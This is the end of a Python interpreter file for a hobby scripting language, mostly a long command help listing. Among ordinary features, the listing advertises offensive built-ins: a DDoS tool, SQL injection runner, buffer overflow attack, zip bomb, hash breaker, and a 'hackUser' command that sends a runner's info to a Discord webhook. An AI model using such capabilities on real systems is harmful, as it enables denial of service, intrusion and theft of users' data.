            print("rpcSetup = Setup the rpc protocol")
            print(
                "download;url;filename;output(1=True 0=False) = Download a file from web")
            print(
                "shorturl;varname;url... = Short the URL with tinyurl url shortener and save to variable")
            print(
                "rotateScreen;degree(only 90, 180, 270) = Rotate the screen on hour path")
            print("rotateScreenRandom = Rotate the screen on hour path and random degree")
            print("cloudGet;server.pythonanywhere.com;filename;varname = Get content from SimonCloud (with f-string)")
            print("cloudSet;server.pythonanywhere.com;filename;content... = Set content from SimonCloud (with f-string)")
            print("cloudCom;server.pythonanywhere.com;outputVarname;command... = Start Command Prompt Command from SimonCloud (with f-string)")
            print("cloudStart = Start SimonCloud Server for PythonAnywhere Server Coding (with flask) (with f-string)")
            print("SimonicNet.Create;ip or dns;password = Create a server from SimonicNet (Free and unlimited) (SimonicNet: A versatile Internet platform facilitating server deployment, management, and interaction with other servers. Exclusive servers accessible solely through SimonicLang, not found on the worldwide web, enabling unique communication capabilities.)")
            print("SimonicNet.SetFile;ip or dns;password;filename;content... = Create file or open file and set content from server")
            print(
                "SimonicNet.GetFile;ip or dns;password;filename;varname = Get file content from server")
            print("SimonicNet.SetOpenFile;ip or dns;password;filename;content... = Create public file or open public file and write content from server")
            print(
                "SimonicNet.GetOpenFile;ip or dns;filename;varname = Get content of public file from server")
            print(
                "SimonicNet.Open;ip or dns;varname = Get content of public main named file from server")
            print("SimonicNet.WebOpen;ip or dns = Open server on user's browser")
            print(
                "SimonicNet.GetAll;ip or dns;password;varname = Get all data from server.")
            print(
                "SimonicNet.Search;query;result count;varname = Search on SimonicNet browser")
            print("novasock;varname = Create a Novaleus Socket (Internet access socket (TCP) with a completely hidden proxy (Not fast))")
            print("novasock.set_default_socket;varname = Replace Novaleus Socket system with standard socket system (gain automated proxy) (may contain errors)")
            print("novasock.set_virtual_socket;varname = Fix standard socket system and disconnect standard with Novaleus")
            print("novasock.bind;varname;target;port = Bind to target server")
            print("novasock.connect;varname;target;port = Connect to target")
            print("novasock.settimeout;varname;seconds = Set time out limit")
            print("novasock.create_ssl;varname = Create default SSL/TCL Protocol context and upload to your Novaleus Socket")
            print("novasock.remove_ssl;varname = Remove the SSL/TLS Protocol context")
            print("novasock.sendall;varname;pack... = Send the pack to connected target")
            print(
                "novasock.recv;varname;varname2 = Load the reciev and save to a variable")
            print("novasock.close;varname = Close and shutdown the Novaleus Socket")
            print("HttpServer;host;port;apikey;varname = Create HTTP Server and save to variable (methods=GET, POST, PUT, DELETE)")
            print("HttpServer.Setfile;varname;path;content... = Change or create content of file path (path e.g. /index.html)")
            print("HttpServer.GetFile;varname;path;resultVarname = Get content from server file and save to result variable")
            print("HttpServer.DelFile;varname;path = Delete file from server")
            print("HttpServer.Run;varname;logfile.txt = Run the server")
            print("HttpsServer;host;port;apikey;varname = Create HTTP Server and save to variable (Certificate file=server.crt, Key File=server.key) (methods=GET, POST, PUT, DELETE)")
            print("HttpsServer.Setfile;varname;path;content... = Change or create content of file path (path e.g. /index.html)")
            print("HttpsServer.GetFile;varname;path;resultVarname = Get content from server file and save to result variable")
            print("HttpsServer.DelFile;varname;path = Delete file from server")
            print("HttpsServer.Run;varname;logfile.txt = Run the server")
            print(
                "smsc;varname = Midi Music Creator tool start on variable (SimonicMusic SMSC)")
            print("smsc.tempo;varname;tempo = Change all time music speed ")
            print("smsc.add;varname;code... = Add note/music to your midi file (code='Track/Pitch/Duration/Volume' or use 'null' to wait)")
            print("smsc.save;varname;filename = Save your midi file to file")
            print(
                "smai;varname = An artificial intelligence model with its own NLP algorithm (SimonicAI)")
            print("smai.clearbuffer;varname = Resets additional use of AI (Resets Nerve level and AI preference algorithm)")
            print(
                "smai.resetbrain;varname = Completely resets the brain of artificial intelligence")
            print(
                "smai.use;varname = The method of changing decisions to give different answers")
            print(
                "smai.getXyz;varname;outvarname = Outputs artificial intelligence statistics in json format")
            print(
                "smai.check;varname = Important function to keep the nerve level at a certain level")
            print(
                "smai.shuffle;varname = A second method to shake up the entire AI brain to respond differently")
            print(
                "smai.learn;varname;word;xyz = learn some words to ai, xyz: 0=Negative 1=Positive")
            print("smai.unlearn;varname;word = Nevermind some word")
            print("smai.autolearn;varname;splitter;text = Automatic learning strategy by combining artificial intelligence's current state with its own decision")
            print("smai.weblearn;varname;url = Autolearn Function is a function made by retrieving data from the internet.")
            print(
                "smai.read;varname;text = Artificial intelligence changes emotions by reading the comment")
            print("smai.get;varname;joiner;adds(0=False 1=True its means .,!? chars);length;recvvarname = Artificial intelligence is a response mechanism with an algorithm that responds with its own decisions and emotions and speaks in a different way.")
            print("smai.save;varname;file = Save ai brain to file")
            print("smai.load;varname;file = Load ai brain in file")
            print("smai.goodquiz;varname;outvarname = It is an accuracy measurement mechanism, it measures the similarity of each decision of artificial intelligence (In short, it measures the similarity of the desired answer and the given answer.)")
            print("aimusic;filename;length(e.g. 5);tempo(e.g. 120);durations(e.g. 1);tracks(guitar/piano/bass/violin/flute/trumpet/drum/trap/lofi);noteadd(optional: A note number for add to note) = AI Music Generator from SimonicMusic")
            print("simac;varname;id(optional text);base(console/32/64) = Creates a virtual Simacleus operating system (In memory) (Simacleus)")
            print(
                "simac.write;varname;filename;content... = Create or set file on os (Simacleus)")
            print("simac.read;varname;filename;resultVarname = Read content of file on os and save to result variable (Simacleus)")
            print("simac.mkdir;varname;path = Create directory on os (Simacleus)")
            print("simac.rmdir;varname;path = Remove directory from os (Simacleus)")
            print("simac.listdir;varname;path;resultVarname = Get text list of files on directory path (Simacleus)")
            print("simac.run;varname = It replaces the virtual operating system with real-time Python compiler commands (So, while normal commands are used, the virtual OS is actually used for file operations) (Simacles)")
            print("simac.stop;varname = It stops real-time command change in the loop (Commands continue to be executed in different ways, re-importing the modules can fix it) (Simacleus)")
            print(
                "nebu.portscan;host;port;varname(results: 1=True 0=False) = Scan port of host (Nebuleus Tools)")
            print(
                "nebu.findserver;port;varname = Find a real server ip from web (Nebuleus Tools)")
            print(
                "nebu.findproxy;port;varname = Find a real HTTP Proxy server ip from web (Nebuleus Tools)")
            print("nebu.findurls;url;varname = Find all urls from the target and save to list variable (Nebuleus Tools)")
            print("nebu.findtextobj;url;objname;varname = Find html text variable objects from html code and save to list variable (Nebuleus Tools)")
            print("nebu.findintobj;url;objname;varname = Find html integer variable objects from html code and save to list variable (Nebuleus Tools)")
            print("nebu.findhtmlobj;url;objname;varname = Find html objects (like h1) from html code and save to list variable (Nebuleus Tools)")
            print(
                "nebu.send;type(tcp/udp);host;port;pack... = Send to target a pack (Nebuleus Tools)")
            print("nebu.send_withrecv;type(tcp/udp);host;port;varname;pack... = Send to target a pack and get recv save to variable (Nebuleus Tools)")
            print("nebu.sendssl;type(tcp/udp);host;port;pack... = Send to target a ssl(https encrypted) pack (Nebuleus Tools)")
            print("nebu.sendssl_withrecv;type(tcp/udp);host;port;varname;pack... = Send to target a ssl(https encrypted) pack and get recv save to variable (Nebuleus Tools)")
            print("sc;varname;type(tcp/udp);host(e.g. localhost);port(e.g. 5000) = Create a Server Socket in client (ServerSocket Tools)")
            print("sc.accept;varname;id(e.g. myclient) = Accept connection and get requests save to a data id (ServerSocket Tools)")
            print("sc.get_data;varname;id;resultVarname = Get request data from client data id (ServerSocket Tools)")
            print("sc.get_host;varname;id;resultVarname = Get connection host (ip) from client data id (ServerSocket Tools)")
            print("sc.get_port;varname;id;resultVarname = Get connection port from client data id (ServerSocket Tools)")
            print("sc.send;varname;id;pack... = Send pack to client (ServerSocket Tools)")
            print(
                "sc.close;varname;id = Close the client connection from client data id (ServerSocket Tools)")
            print("sc.clear;varname;id = Remove the client data id (ServerSocket Tools)")
            print("sc.stop;varname = Stop all Server Socket (ServerSocket Tools)")
            print("firo.allpaths;path;varname = Find all directorys in the path and save to list variable (Firoleus Tools)")
            print("firo.search;path;varname;query = Find files have query in the path and save to list variable (Firoleus Tools)")
            print("firo.searchext;path;varname;ext(e.g .jpg .img) = Find files have extension in the path and save to list variable (Firoleus Tools)")
            print("openai;varname;your_api_key = Create a simple OpenAI ai")
            print("openai.set;varname;engine = Set engine of OpenAI variable")
            print("openai.talk;varname;resultVarname;size(1=50 max tokens 2=100 max tokens...);text/prompt... = Create completion with OpenAI variable")
            print("smdb;varname = Create a database with SimonicDB")
            print("smdb.set;varname;dataname;onewayhash?(1=True 0=False);onewayhash_length(character length);text/data... = Add or set a data")
            print("smdb.set_with_encrypt;varname;dataname;onewayhash?(1=True 0=False);onewayhash_length(character length);password;text/data... = Add or set a data (with SimonicDB Encrypter)")
            print("smdb.get;varname;dataname;resultVarname = Get data from database")
            print("smdb.get_with_decrypt;varname;dataname;password;resultVarname = Get data from database (with SimonicDB Decrypter)")
            print("smdb.del;varname;dataname = Delete the data from database")
            print("smdb.save;varname;file = Save database to a file")
            print("smdb.load;varname;file = Load database from a file")
            print("clipboard.copy;text... = Copy in to the clipboard")
            print("clipboard.paste;varname = Get text on the clipboard")
            print("smbrow;varname = Create a SimonicBrowser (A module where users can create their own browsers that they can use) (default username=default)")
            print("smbrow.setApp;varname;appName;appVersion = Mechanism through which users can edit their own application information (for user agent)")
            print("smbrow.getAgent;varname;varname2 = Get user agent of browser and saves to variable (Function that fetches the main user agent)")
            print("smbrow.setAgent;varname;yourUserAgent... = Set user agent of browser")
            print("smbrow.setupAgent;varname = A mechanism that creates a random user agent based on device information (automatic)")
            print("smbrow.makeUser;varname;user = Create a user on browser")
            print("smbrow.resetHistory;varname;user = Clear history of user")
            print("smbrow.resetCookies;varname;user = Clear all cookies of user")
            print(
                "smbrow.setCookie;varname;user;target(e.g. example.com);cookie... = Set a cookies of user")
            print(
                "smbrow.getCookie;varname;user;target;varname2 = Get cookies of user and savet to variable")
            print(
                "smbrow.getHistory;varname;user;varname2 = Get history of user and save to list variable")
            print("smbrow.save;varname;filename = Save the browser")
            print("smbrow.load;varname;filename = Load the browser")
            print(
                "smbrow.open;varname;user;varname2;url... = Open the content of target and save to variable")
            print("smbrow.download;varname;user;file;output(1=True 0=False);url... = It takes all the data it can from the address and saves it to a file.")
            print("smbrow.send;varname;user;type(form=xwwwform, post=application json);data;varname2;url = Send data to target and save the recv to a variable")
            print("smbrow.search;varname;user;varname2;query;resultcount = Search with the system and save urls to a list variable (using web scraping; uses Bing and google searching)")
            print("smbrow.restoreLocs;varname;varnameofcontent;mainurl;varnameofnewcontent = Creates locations that require full connectivity (example: '/main.html' becomes 'http://example.com/main.html/')")
            print(
                "smradio.set;channelName;data... = Set data of the channel (SimonicRadio Services)")
            print("smradio.get;channelName;varname... = Get data of the channel and save to a variable (SimonicRadio Services)")
            print(
                "genar;varname = A system that can generate information based on specific seed IDs")
            print(
                "genar.set;varname;infoname;list(e.g. ['hello', 'world']) = Set info generator list")
            print("genar.remove;varname;infoname = Remove the info generator")
            print(
                "genar.generate;varname;id;varname2 = Generate info and save to json variable")
            print("vram.create;ramVarname = Create a Virtual Ram (Real virtual memory tool requiring internet using SimonicRadio)")
            print(
                "vram.get_id;ramVarname;resultVarname = Get server data id of Virtual Ram")
            print(
                "vram.load_id;ramVarname;id = Restore your memory ID and access your memory again")
            print(
                "vram.set;ramVarname;variableName;data = Set data of variable from Virtual Ram")
            print(
                "vram.get;ramVarname;variableName;resultVarname = Load the variable from Virtual Ram")
            print("setVolume;value = Set all volume")
            print("setBrightness;value = Set monitor brightness")
            print("setDateTime;year;month;day;hour;minute;second = Set Date && time")
            print("setRandomVolume = Set random all volume")
            print("setRandomBrightness = Set monitor random brightness")
            print("setRandomDateTime = Set random Date && time")
            print("restoreDateTime = Restore date && time with servers")
            print(
                "checkNetwork;varname = Check internet on/off (Results: 0=Close 1=Open)")
            print("sendBotMail;target;subject;mes... = Send E-Mail with SimonicLang free bot account ( simoniclang@hotmail.com )")
            print(
                "sendMail;serverSmtp;port;account;password;target;subject;mes = Send E-Mail")
            print("randomChc;varname;list... = Random choice from list (with f-string) (list e.g. apple;melon;code)")
            print("bufferOverFlow;number... = It initiates an ordinary buffer over flow attack, waits for the entered value a while, and also runs in the background (with f-string)")
            print(
                "dcwhSendF;url;text... = Send a text to Discord Webhook (with f-string)")
            print("dcwhSend;url;text... = Send a text to Discord Webhook")
            print("sysExit = System Exit")
            print("page;varname;title = Create a Pageleus GUI App")
            print("page.update;varname = Update the design changes")
            print("paeg.add_image;varname;id;file = Add image to GUI App")
            print("paeg.set_image;varname;id;file = Set image from GUI App")
            print("page.add_label;varname;id;text;font;size = Add label to GUI App")
            print("page.set_label;varname;id;text = Set text of label")
            print(
                "page.add_button;varname;id;text;width;height;code... = Add button to GUI App")
            print("page.set_button;varname;id;text;code... = Set text and code of button")
            print("page.add_input;varname;id;text;width = Add input entry to GUI App")
            print("page.set_input;varname;id;text = Set text of input entry")
            print(
                "page.get_input;varname;id;varname2 = Get text of input entry and save to variable")
            print("page.add_text;varname;id;text;width;height;editable(1=True 0=False) = Add scrolled text to GUI App")
            print("page.set_text;varname;id;text;editable(1=True 0=False) = Set text/editable_option of scrolled text")
            print(
                "page.get_text;varname;id;varname2 = Get text of scrolled text and save to variable")
            print("page.add_menu;varname;id = Add tool-bar menu to GUI App")
            print(
                "page.add_optionlist;varname;id;list_id;name = Add option list to tool-bar menu")
            print(
                "page.add_option;varname;list_id;name;code... = Add option to option list from tool-bar menu")
            print(
                "page.add_splitter;varname;ist_id = Add splitter to option list from tool-bar menu")
            print("page.set_colors;varname;background-color;texts-color(fore color);background-color-2 = Set colors of GUI App")
            print("page.fullsc;varname = Set GUI App screen as full screen")
            print("page.boxsc;varname = Set GUI App screen as box screen")
            print("page.msgBox;title;text = Create a message box")
            print("page.warnBox;title;text = Create a warning box")
            print("page.errorBox;title;text = Create a error box")
            print(
                "page.okBox;title;text;resultVarname(1=Confirmed 0=False) = Create a okay or cancel box")
            print(
                "page.questBox;title;text;resultVarname(1=Confirmed 0=False) = Create a question box")
            print(
                "page.confirmBox;title;text;resultVarname(1=Confirmed 0=False) = Create a yes or no box")
            print(
                "page.tryBox;title;text;resultVarname(1=Confirmed 0=False) = Create a retry or cancel box")
            print("page.colorchc;title;varname = Color chooser")
            print("page.filechc;title;varname = File chooser")
            print("page.close;varname = Close the Main GUI Screen")
            print("page.hide;varname = Hide the Main GUI Screen")
            print("page.open;varname = Open the hide barrier of the Main GUI Screen")
            print("page.icon;varname;file/path = Set icon of the Main GUI Screen")
            print("page.title;varname;title = Set title of Main GUI Screen")
            print("page.remove;varname;id = Remove the object/widget")
            print("page.mainloop;varname = Start a main loop of GUI App")
            print(
                "fullBox;backgroundColor;textColor;text = Display text to all of screen")
            print("fullBoxUnClose;backgroundColor;textColor;text = Display text to all of screen (with disable closing)")
            print(
                "changeBg.color;red%;green%;blue% = Change background to color (Only Windows)")
            print(
                "changeBg.image;image_name_or_path = Change background to windows (Only Windows)")
            print("changeBg.random = Change background to random color (Only Windows)")
            print("disableExit = disable sys.exit functions")
            print("whois;target;varname... = Search info with whois (f-string)")
            print(
                "loop;option;code... = Looping (options: <> While or number to normal loop)")
            print(
                "loopf;option;code... = Looping (options: <> While or number to normal loop) (with f-string)")
            print("forLoop;varname;objvarname;code... = Run for looping")
            print("showimg;title;filename = Show image on windows")
            print("showimg.stop = Stop all image windows")
            print("runPy;code... = Run Python Code (with f-string)")
            print("runSL;code... = Run SimonicLang Code (with f-string)")
            print("runCmd;command... = Run os command (with f-string)")
            print("runUserCmd;command... = launches operating system commands with the user's interface (This increases the overall stability and also allows us to have strong privileges) (with f-string)")
            print(
                "runHtml;htmlcode... = Run html with web browser server (with f-string)")
            print(
                "runHtmlScreen;htmlcode... = Run html on a box screen (tkhtmlview powered) (with f-string)")
            print("stopHtml = Stop html web browser servers")
            print("startHtml = Start html web browser servers")
            print("runShell;command... = Run Shell Command (with f-string)")
            print("runPShell;command... = Run PowerShell Command (with f-string)")
            print("runExe;filename... = Run exe file")
            print("runAsync;await;code... = Run SimonicLang code with Async")
            print(
                "runBF;outputVarname;tapeMemorySize;code... = Run BrainFuck code and save output to variable")
            print(
                "listenMic;duration(seconds);filename = Listen the microphone and save data to file.wav")
            print("runC;code... = Run the C code")
            print("runJS;code... = Run the Java script code")
            print("runJava;code... = Run the Java code")
            print("runRuby;code... = Run the Ruby code")
            print("runSwift;code... = Run the Swift code")
            print("runGo;code... = Run the Go code")
            print("runPHP;code... = Run the PHP code")
            print("clearOut = Clear outputs")
            print("clearIn = Clear and reset in system")
            print(
                "proxyGet;url;varname = Get website content with random proxy (with f-string)")
            print("webOpen;url... = Open web page with user's browser (with f-string)")
            print("save;filename = Save variables and all")
            print("load;filename = Load variables and all")
            print("file.create;filename = Create file")
            print("file.write;filename;content... = Write content to file")
            print(
                "file.writef;filename;content... = Write content to file (with f-string)")
            print(
                "file.writebin;filename;content... = Write content to file (write binary)")
            print(
                "file.writebinf;filename;content... = Write content to file (with f-string) (write binary)")
            print("file.read;filename;varname = Open file and write content to variable")
            print(
                "file.readf;filename;varname = Open file and write content to variable (with f-string)")
            print(
                "file.readbin;filename;varname = Open file and write content to variable (read binary)")
            print("file.readbinf;filename;varname = Open file and write content to variable (with f-string) (read binary)")
            print("file.delete;filename = Delete file (with f-string) (It destroys beyond reach and is also very fast.)")
            print("dir.create;dirname = Create a directory (with f-string)")
            print("dir.open;dirname = Open directory (with f-string)")
            print("dir.delete;dirname = Delete directory (with f-string)")
            print("fd.ls;varname = List the dir and save to variable (file/dir)")
            print("fd.rename;name;newname = Change name of file/dir")
            print("fd.move;path/name;newpath = Move the file/dir")
            print("fd.info.type;name;varname = Find type of the target and save to variable (results: f=file d=directory) (file/dir)")
            print("fd.info.name;path;varname = Get name of file/dir")
            print("fd.info.ext;path/name;varname = Get extension of file/dir")
            print("fd.info.size.b/kb/mb/gb;path/name;varname = Get size of file/dir")
            print("fd.info.cdate;path/name;varname = Get creation date of file/dir")
            print("fd.info.adate;path/name;varname = Get last access date of file/dir")
            print("fd.info.mdate;path/name;varname = Get last modification of file/dir")
            print("fd.info.perm;path/name;varname = Get permission oct of file/dir")
            print("zipbomb;filename;mbsize = Creates ZipBomb File (A file that is high in size but appears small and crashes the machine when opened)")
            print("thread;code... = Start code with threading")
            print("threadjoin = Join all threads")
            print(
                "checkPhone;countryCode;phoneNumber;resultVarname(1=True 0=False) = Check phone number")
            print(
                "findPhone;countryCode;varname = Find real phone number and save to variable")
            print("simonddos;tcp/udp;target;port;size(optional);pernum(optional);logfilename(optional) = Start a Simon's Ddos")
            print("randomAPI;hexlength;varname = Random API Key Creator")
            print("simonddos.stop = Stop Simon's Ddos")
            print(
                "sqlinjectionRun;target;pathname;variable(url);filename(optional) = Start SQL Injection Project")
            print("netInfo;ip/dns;varname = Get all internet info from ip/dns")
            print("netIp;dns;varname = Get ip info from dns")
            print("netHost;ip;varname = Get host/dns from ip")
            print(
                "hash;algorithm(e.g. sha256);varname;text... = Hash the text and save to a variable")
            print("breakhash;algorithmResultVarname;textResultVarname;hashed text... = Break hash and save results to variables")
            print("cia.get;country-name;varname = Get country info from CIA World Factbook Database")
            print("clock;varname = Creates timer class")
            print("clock.run;varname = Starts the timer")
            print(
                "clock.stop;varname;resultVarname = Stops the timer and save result seconds to variable")
            print(
                "hackUser;url;logtitle = Hack the code starter and send info to Discord Webhook address")
            print(
                "hackFiles;content... = gives a specific content to all files in the folder")
            print("radioSignal;duration(seconds integer);sampleRate;hz(frequency) = Create a radio signal and plays signal sound (sinusoidal)")
            print("radioSignalBg;duration(seconds integer);sampleRate;hz(frequency) = Create a radio signal but no plays sound (sinusoidal)")
            print(
                "httpSend;target;port;method;path/option = HTTP Request Sending (with f-string)")
            print("httpSendR;target;port;method;path/option;varname = HTTP Request Sending and get all recv write to variable (with f-string)")
            print("httpSendRD;target;port;method;path/option;varname = HTTP Request Sending and get only data recv write to variable (with f-string)")
            print(
                "httpHead;header;value... = Set or create a http header (with f-string)")
            print("httpHeadR;header = Remove http header (with f-string)")
            print(
                "math;option;varname = Start math progress and output writes to variable (with f-string)")
            print("translate;resultVarname;currentLanguage(auto/name e.g. en/tr/fr/de/it...);targetLanguage;text... = Translate the text (with Google translate)")
            print(
                "unicodeSearch;query;varname = Search characters on unicode and save to a list variable")
            print(
                "IF;value1;option;value2;if=trueCode...;else=falseCode... = Start if progress (with f-string)")
            print("break = Break the loop/loopf/forLoop")
            print("help = Help for SimonicLang")
            print("How to use F-String? (this process dont have mathing):")
            print("$<n> = Newline")
            print("$<t> = Tab character")
            print("$<r> = Carriage return")
            print("$<c.reset/red/green/yellow/blue/purple/blue2/white/black/gray> = Change text colors (Ascii Color Codes)")
            print("$<bold> = Change text to bold text (use c.reset for disable)")
            print("$<smlangUrl> = Display SimonicLang Github link")
            print("$<v.varname> = Geting variable value")
            print("$<vup.varname> = Geting variable value with upper charset")
            print("$<vlow.varname> = Geting variable value with lower charset")
            print("$<vlen.varname> = Geting variable string value length")
            print("$<vord.varname> = Geting Ascii Ord Number of chr variable")
            print("$<vchr.varname> = Geting chr of Ascii Ord Number")
            print("$<vbin.varname> = Geting binary code string of string variable")
            print("$<vtext.varname> = Geting string of binary code string variable")
            print("$<fakeUA> = Create random fake user agent")
            print("$<random.ip> = Random created fake ip")
            print("$<random.apikey.16/32/64/128> = Random API Key")
            print("$<random.server> = Random Real Server IP:PORT (Server Finder)")
            print("$<basefile> = Base code file")
            print("$<sys.name> = Os's name")
            print("$<sys.sys> = System name")
            print("$<sys.ver> = System version")
            print("$<sys.node> = System node")
            print("$<sys.user> = Os's Username")
            print("$<sys.user2> = Get Os's Username with getpass")
            print("$<sys.path> = Base path")
            print("$<sys.prcsr> = System processor")
            print("$<sys.pyver> = Python version")
            print("$<sys.slver> = SimonicLang version")
            print("$<sys.mac> = System machine")
            print("$<sys.arch> = System architecture")
            print("$<sys.ip> = Machine's IP Address")
            print("$<sys.host> = Machine's Host/DNS Address")
            print("$<ram.b/kb/mb/gb> = Display RAM deposit")
            print("$<ramav.b/kb/mb/gb> = Display RAM Avaible deposit")
            print("$<ramus.b/kb/mb/gb> = Display RAM Uses deposit")
            print("$<prcsc> = System Process count")
            print("$<date> = Get all date info")
            print("$<date.y> = Get now year")
            print("$<date.m> = Get now month")
            print("$<date.d> = Get now day")
            print("$<date.h> = Get now hour")
            print("$<date.mn> = Get now minute")
            print("$<date.s> = Get now second")
            print("$<pi> = Insert PI Value")
            print("$<sys.code> = Get all System SimonicLang code")
            print("$<sys.args.number> = Replace the system runing args")
            print("$<args.argname> = Replace the args")
            print("Example Code:")
            print("""optilogf;Hello $<sys.user>!$<n>
optilogf;Virtual os loading...$<n>
simac;a;example123;32
simac.run;a
note;This code makes memory based virtual os
optilogf;Virtual os launched!$<n>
wait;1
unicodeRandomText;text;33;128;25
note;This code makes random unicode text
fstr;simac.write;a;a.txt;$<v.text>
simac.read;a;a.txt;a
note;This code writes to virtual file and reads
optilogf;Virtual File content: $<v.a>$<n>
optilogf;SimonicNet loading...$<n>
randomAPI;16;pawd
fstr;SimonicNet.Create;88.45.123.9;$<v.pawd>
note;This code makes api key and creates SimonicNet server with api key password (unlimited)
optilogf;SimonicNet server created!$<n>
fstr;SimonicNet.SetFile;88.45.123.9;$<v.pawd>;a.txt;Hello for world
optilogf;Real virtual file created with my cloud server...$<n>
wait;10
func;hello;text;log;$<args.text>
func.run;hello;Hello for users!
shutdown
note;close the pc...""")
    except Exception as e:
        if errors:
            orint(f"Error: [[{e}]] in '{code}'.\n")


# --RETURN AUTO SEPERATOR--
syscode = ""
if len(sys.argv) >= 2:
    name = sys.argv[1]
    with open(name, "r") as f:
        c = f.read()
    s = Syntax()
    syscode = c
    s.run(c)
else:
    print(f"SimonicLang v1.0.5 (by aertsimon90)-Powered By Python")
    while True:
        a = input("\n>>> ")
        syscode = a
        runCode(a)
